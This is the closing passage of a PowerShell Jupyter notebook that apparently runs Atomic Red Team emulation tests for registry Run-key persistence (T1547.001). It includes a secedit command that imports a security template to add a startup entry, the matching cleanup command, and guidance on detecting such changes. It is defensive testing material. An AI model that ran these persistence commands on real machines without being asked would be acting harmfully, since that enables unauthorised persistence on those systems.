    "```command_prompt\nsecedit /import /db mytemplate.db /cfg $PathToAtomicsFolder\\T1547.001\\src\\regtemplate.ini\nsecedit /configure /db mytemplate.db\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95f56867",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "ce409e5e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fba78fbf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.001 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d097ed5f",
   "metadata": {},
   "source": "## Detection\nMonitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}